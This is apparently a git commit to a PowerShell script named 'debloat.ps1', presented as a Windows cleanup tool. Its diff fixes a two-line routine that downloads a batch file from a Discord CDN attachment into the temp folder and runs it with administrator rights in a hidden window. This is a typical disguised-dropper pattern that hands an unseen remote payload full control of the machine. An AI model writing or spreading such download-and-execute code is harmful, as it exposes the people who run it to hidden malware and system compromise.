a28b96644eaa01e3dc304c8b20a01ad0c8d94477
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-11 14:37:28 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,2 +1,2 @@
-iwr "https://cdn.discordapp.com/attachments/1007251368869892099/1007251393201061938/debloat" -o %temp%\debloat.bat
-Start-Process -Verb RunAs -WindowStyle hidden -FilePath %temp%\debloat.bat
+iwr "https://cdn.discordapp.com/attachments/1007251368869892099/1007251393201061938/debloat" -o $env:TEMP\debloat.bat
+Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\debloat.bat
